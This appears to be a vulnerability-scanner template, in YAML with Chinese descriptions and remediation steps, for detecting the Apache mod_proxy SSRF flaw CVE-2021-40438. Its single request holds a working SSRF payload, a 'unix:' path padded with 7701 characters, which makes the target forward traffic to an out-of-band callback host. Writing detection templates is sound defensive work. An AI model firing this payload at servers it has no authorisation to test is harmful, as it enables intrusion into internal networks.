id: CVE-2021-40438
info:
  name: Apache <= 2.4.48 Mod_Proxy SSRF
  author:
  - l0ne1y
  description: |-
    Apache HTTP Server mod_proxy 模块 SSRF漏洞
    Apache HTTP Server是美国阿帕奇（Apache）基金会的一款开源网页服务器。该服务器具有快速、可靠且可通过简单的API进行扩充的特点。
    Apache HTTP Server mod_proxy 模块存在SSRF漏洞，远程攻击者可通过发送精心构造的 uri-path 导致 mod_proxy 将请求转发到攻击者所选择的源服务器。
  severity: critical
  remediation: |-
    **官方修复建议**
    目前厂商已发布新版本以修复漏洞，具体参考官方链接：
    https://httpd.apache.org/security/vulnerabilities_24.html

    **临时修复建议**
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    words:
    - Interactsh Server
  path:
  - '{{BaseURL}}/?unix:{{repeat("A", 7701)}}|http://interact.sh/'
  method: GET
  max-redirects: 2
  redirects: true
